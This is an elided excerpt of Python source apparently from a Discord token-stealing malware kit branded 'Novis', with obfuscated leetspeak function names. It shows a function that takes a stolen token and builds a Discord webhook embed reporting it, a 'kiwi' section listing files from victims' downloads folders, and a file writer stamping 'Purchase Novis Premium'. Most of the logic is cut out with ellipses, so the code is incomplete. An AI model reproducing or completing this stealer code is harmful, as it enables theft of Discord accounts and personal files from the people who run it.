...
def upl05dT4k31(t0k3n, path):
    ...
    if pfp == None: 
        pfp = "https://i.imgur.com/xuwZpZ1.png"
    else:
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "discord.gg/debt",
                "icon_url": "https://i.imgur.com/32RBbGd.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://i.imgur.com/EHD6KHJ.png",
        "username": "Novis",
        "attachments": []
        }
    ...
    if name == "kiwi":
        data = {
            ...
            "embeds": [
                ...
                "fields": [
                    {
                    "name": "Files in users downloads directories:",
                    "value": link
                    }
                ],
                "author": {
...
def wr1tef0rf1l3(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<- Purchase Novis Premium ->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
